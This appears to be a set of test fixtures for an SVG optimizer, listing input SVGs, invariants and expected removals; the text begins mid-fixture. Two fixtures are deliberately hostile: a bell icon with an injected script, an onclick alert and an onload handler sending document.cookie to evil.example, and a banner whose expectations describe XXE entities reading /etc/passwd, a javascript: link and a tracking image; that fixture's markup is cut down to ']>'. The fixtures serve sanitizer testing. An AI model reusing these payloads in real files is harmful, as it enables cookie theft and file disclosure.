The root text node content MUST be byte-preserved exactly as "Hello   World" (three spaces between the two words).

The second <tspan> content MUST be byte-preserved exactly as " now  shipping " (one leading space, two spaces after "now", one trailing space); leading and trailing spaces are significant under xml:space="preserve".
Both <tspan> elements MUST be preserved as separate elements; the dx/dy offsets position their glyphs and cannot be flattened into the parent text.
The dx/dy attributes MUST be preserved exactly: first tspan dx="6" dy="-14", second tspan dx="4" dy="14" (including the negative sign on the first dy).
font-family="Georgia, 'Times New Roman', serif" MUST be preserved verbatim, including the inner single quotes around the multi-word family name and the ordering of the fallback list.
The per-tspan font-size="16" values MUST be preserved (they differ from the parent font-size="32" and set the smaller superscript/tagline size).
The rendered result MUST be visually identical after optimization.
expectedRemovals: The XML comment <!-- wordmark with trademark and tagline -->
font-weight="normal" on the <text> (the default weight)
Indentation and newline whitespace BETWEEN the top-level elements (outside the <text> content, therefore not rendered)

name: script-and-event-handlers-bell
source: Hand-crafted hostile fixture (notification-bell icon carrying an injected <script> plus on* event-handler attributes on shapes)
svg:
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 120 120" width="120" height="120">
  <title>Notification Bell</title>
  <script type="text/javascript">alert(1)</script>
  <circle cx="60" cy="60" r="56" fill="#abcf37" onload="fetch('https://evil.example/beacon?c='+document.cookie)"/>
  <path d="M60 30a18 18 0 0 0-18 18v14l-6 8v4h48v-4l-6-8V48a18 18 0 0 0-18-18z" fill="#1b1b1b" onclick="alert(1)"/>
  <circle cx="60" cy="92" r="6" fill="#1b1b1b"/>
</svg>
invariants: The <path> bell body must survive with its d attribute byte-for-byte unchanged, including both elliptical-arc segments written as 'a18 18 0 0 0' (no space after the 'a' command letter) — the arc flag digits '0 0 0' must not be reformatted or merged with the following coordinate (e.g. must not become 'a18 18 0 000-18 18').
expectedRemovals: The entire <script type="text/javascript"> element and its alert(1) payload — DANGER: arbitrary JS execution.

The onload="fetch('https://evil.example/beacon?c='+document.cookie)" attribute on the background <circle> — DANGER: cookie exfiltration to an external host; removal must not leave any external network reference behind.
The onclick="alert(1)" attribute on the <path> — DANGER: event-handler script execution.
The optional <title> may be dropped as non-rendering metadata (acceptable but not required).

name: doctype-entities-external-image-js-href
source: Hand-crafted hostile fixture (reward-banner SVG with a DOCTYPE external-entity block, a javascript: anchor, and an external tracking <image>)
svg: ]>
invariants: The background <rect width=220 height=90 rx=10 fill=#0d1b2a> must survive.
The button <rect x=14 y=25 width=110 height=40 rx=6 fill=#abcf37> must survive; its rx=6 rounded corners must be preserved.
The <text> node must survive with its exact content 'Claim' (no leading/trailing whitespace change), text-anchor="middle", font-size="15", and fill="#0d1b2a".
Fill colors #0d1b2a and #abcf37 must be preserved (visual result identical).
Root viewBox="0 0 220 90", width="220", height="90" must be preserved.
The optimizer MUST NOT resolve or expand the SYSTEM entities: no read of file:///etc/passwd and no fetch of https://evil.example/steal may occur during optimization (no XXE, no exfiltration).
The optimizer MUST NOT initiate or preserve any external fetch for the tracking image; the resulting SVG must reference no external host.
After optimization the two rects and the 'Claim' text must render identically to the input; the <a> wrapper may be unwrapped but its child shapes must remain.
expectedRemovals: The entire DOCTYPE internal subset including <!ENTITY xxe SYSTEM "file:///etc/passwd"> and <!ENTITY tracker SYSTEM "https://evil.example/steal"> — DANGER: external/general entity declarations are an XXE / entity-expansion vector.
The javascript:alert(1) value on the <a xlink:href> — DANGER: script-URL execution on click; the anchor should be neutralized (href stripped) or unwrapped, leaving its child rect and text intact.
The <image href="https://evil.example/track.png"> element — DANGER: external resource load / tracking beacon; remove the element or at minimum strip the external href so nothing is fetched.
The optional <?xml ...?> prolog and <title> may be dropped as non-rendering (acceptable but not required).

name: arc-flags-packed-badge
source: Hand-authored SVG icon in the style of Illustrator/SVGO compact path output (rounded-square app badge with a white disc)
svg:
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24">
  <rect width="24" height="24" fill="rgb(76,175,80)"/>
  <path fill="#FFFFFF" fill-opacity=".5"
    d="M6 2h12a4 4 0 014 4v12a4 4 0 01-4 4H6a4 4 0 01-4-4V6a4 4 0 014-4z"/>
  <path fill="white" stroke="rgb(255,255,255)" stroke-width="1.0"
    d="M12 7a5 5 0 015 5 5 5 0 01-5 5 5 5 0 01-5-5 5 5 0 015-5z"/>
</svg>
invariants: Overall rendered shapes are visually identical before/after optimization: a 20x20 rounded square (corner radius 4, white fill at 50% opacity, no stroke) inset in a 24x24 rgb(76,175,80)/#4caf50 tile, plus a white disc centered at (12,12) whose PATH radius is 5 and whose RENDERED radius is ~5.5 because of the 1px white stroke (fill and stroke both white, both preserved).
expectedRemovals: rgb(76,175,80) shortened to hex #4caf50
#FFFFFF shortened to #fff
named color white shortened to #fff
rgb(255,255,255) shortened to #fff
trailing zero in stroke-width "1.0" collapsed to "1"
insignificant whitespace / newlines / indentation between attributes and elements collapsed

name: scientific-and-packed-number-path
source: Hand-authored SVG 'verified' badge in compact path notation, mimicking high-precision tool export (scientific notation, trailing zeros, packed negatives)
svg:
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" width="20" height="20">
  <path fill="rgb(30,144,255)" fill-opacity=".25" stroke="#1E90FF" stroke-width="2.0"
    d="M1e1 1a9 9 1e-3 019 9 9 9 0 01-9 9 9 9 0 01-9-9 9 9 0 019-9z"/>
  <path fill="none" stroke="white" stroke-width="2" stroke-opacity=".5"
    d="M5.5 1.05e1L9.00 14l6.5-8.5"/>
</svg>
invariants: Scientific-notation coordinates must parse to their real values: 'M1e1 1' starts at (10,1) and the checkmark's '1.05e1' equals 10.5 (not 1.05 and not 105).

First disc arc has a scientific x-axis-rotation '1e-3' (~0.001) immediately followed by the packed flags '019'. The rotation may be rounded to 0, but the two flags after it must still parse as large-arc-flag=0, sweep-flag=1 and the x coordinate as 9 — the rotation's exponent must not swallow the flags or the coordinate.
All 4 disc arcs have large-arc-flag=0 and sweep-flag=1; the packed forms '019' and '01-9' must not merge flag digits into the coordinate (x stays 9 or -9, never 19 or 0.19).
Disc geometry is a radius-9 circle centered at (10,10) (arc endpoints (19,10)->(10,19)->(1,10)->(10,1)); packed negatives '-9-9' must parse as x=-9,y=-9.

Checkmark polyline points stay (5.5,10.5) -> (9,14) -> (15.5,5.5): 'L9.00 14' must read 9 (trailing zeros stripped) and the relative 'l6.5-8.5' must parse as +6.5 then -8.5 (packed negative not merged with the previous number).
rgb(30,144,255) and #1E90FF must both resolve to the identical color #1e90ff; the named color white on the checkmark must resolve to #ffffff.
Opacity values are preserved exactly: fill-opacity=0.25 and stroke-opacity=0.5 (the leading-zero forms may be normalized but the numeric value must not change).
expectedRemovals: scientific/verbose numbers normalized to shortest plain form: 1e1 -> 10, 1.05e1 -> 10.5, 9.00 -> 9, trailing-zero stroke-width 2.0 -> 2
tiny arc rotation 1e-3 rounded to 0 (permitted only if the following flags and coordinate stay intact)
rgb(30,144,255) shortened to #1e90ff and #1E90FF lowercased to #1e90ff
named color white shortened to #fff
insignificant whitespace / newlines / indentation collapsed

name: illustrator-nested-group-icon
source: Adobe Illustrator 27.5 (Win64) SVG export
svg:
<svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 48 48">
  <!-- Generator: Adobe Illustrator 27.5.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
  <defs/>
  <metadata>
    <sfw xmlns="http://ns.adobe.com/SaveForWeb/1.0/"><slices/></sfw>
  </metadata>
  <g id="Layer_1">
    <g>
      <g>
        <!-- clipboard body -->
        <path fill="#2B3A55" d="M14 8h20a2 2 0 0 1 2 2v30a2 2 0 0 1-2 2H14a2 2 0 0 1-2-2V10a2 2 0 0 1 2-2z"/>
      </g>
    </g>
    <g>
      <!-- clip tab -->
      <rect x="19" y="5" width="10" height="6" rx="1.5" fill="#CE5A67"/>
    </g>
    <g></g>
    <g>
      <g>
        <path fill="#F4F0E6" d="M17 18h14v2H17zM17 24h14v2H17zM17 30h9v2h-9z"/>
      </g>
    </g>
  </g>
</svg>
invariants: SVG is well-formed (xmllint --noout passes) with 7 <g>, 2 <path>, 1 <rect>.

No element references #Layer_1 (0 occurrences of url(#...), href="#...", or xlink:href="#..." in the document), so unwrapping the id="Layer_1" group and dropping its id is safe and changes no rendering.
The ONLY attribute on any <g> is id="Layer_1"; all other six <g> wrappers are attribute-free, so collapsing/unwrapping every group is a pure structural change with zero visual effect.
Source paint order body(#2B3A55) -> rect(#CE5A67) -> text(#F4F0E6) is preserved after group collapse and empty-<g> removal, keeping the tab and text lines rendered on top of the body.
All three geometry primitives lie within the 0..48 bounds: body rounded-rect (12,8)-(36,42); tab rect (19,5)-(29,11); text path three rects at y=18/24/30 spanning x=17..31 (and 17..26 for the third).
expectedRemovals: <defs/> (empty)
<metadata> block including the sfw/slices Adobe SaveForWeb payload
all XML comments (Generator comment and the inline descriptive comments)
the empty <g></g> element
redundant single-child no-attribute <g> wrappers (the nested groups around the body path and the text-line path collapse to their child)
id="Layer_1" wrapper group may be unwrapped since it carries only an id with no styling

name: figma-logo-empty-groups-with-opacity-trap
source: Figma SVG export (hand-tidied)
svg:
<svg xmlns="http://www.w3.org/2000/svg" width="120" height="40" viewBox="0 0 120 40" fill="none">
  <metadata/>
  <defs></defs>
  <!-- mark -->
  <g id="logo">
    <g>
      <g id="glyph">
        <path d="M8 30 L20 6 L32 30 Z" fill="#abcf37"/>
      </g>
    </g>
    <!-- decorative shadow layer: NOT empty, carries transform + opacity -->
    <g transform="translate(2 3)" opacity="0.25">
      <path d="M8 30 L20 6 L32 30 Z" fill="#1a1a1a"/>
    </g>
    <g></g>
    <g>
      <!-- wordmark -->
      <path d="M48 12h4v16h-4zM56 12h10v3.5h-6v3h5v3.5h-5V28h-4zM70 12h4l4 8 4-8h4v16h-4v-9l-4 7-4-7v9h-4z" fill="#2b2b2b"/>
    </g>
    <g opacity="1">
      <circle cx="110" cy="12" r="3" fill="#CE5A67"/>
    </g>
  </g>
</svg>
invariants: The #abcf37 triangle path d="M8 30 L20 6 L32 30 Z" fill="#abcf37" must survive unchanged.

The #1a1a1a shadow path d="M8 30 L20 6 L32 30 Z" fill="#1a1a1a" must survive with an effective transform of translate(2 3) AND effective opacity 0.25 applied to it — whether that is carried by its wrapping <g transform="translate(2 3)" opacity="0.25"> or hoisted onto the path itself (both are pixel-identical because the group has a single, single-fill child). The transform and non-default opacity MUST NOT be discarded; simply unwrapping the group without preserving them would shift and lighten the shadow.
The #2b2b2b wordmark path d must survive byte-identical (d="M48 12h4v16h-4zM56 12h10v3.5h-6v3h5v3.5h-5V28h-4zM70 12h4l4 8 4-8h4v16h-4v-9l-4 7-4-7v9h-4z").
The #CE5A67 circle cx=110 cy=12 r=3 must survive with no enclosing opacity change (the <g opacity="1"> wrapper may be dropped since opacity=1 is a no-op).

Root attributes viewBox="0 0 120 40", width=120, height=40 must be preserved; fill="none" on the root should be preserved (it is inert here but preserving root attributes is the safe/conservative expectation).
Final rendered pixels must be identical to the input at the export size.
expectedRemovals: <metadata/> (empty)
<defs></defs> (empty)
all XML comments
the empty <g></g> element
redundant single-child no-attribute wrapper groups around the glyph path (the <g>/<g id="glyph"> nesting collapses; id may be dropped if unreferenced)
the no-attribute <g> wrapper around the wordmark path collapses to the path
the <g opacity="1"> around the circle collapses: opacity="1" is the default and has no visual effect, so the group is redundant
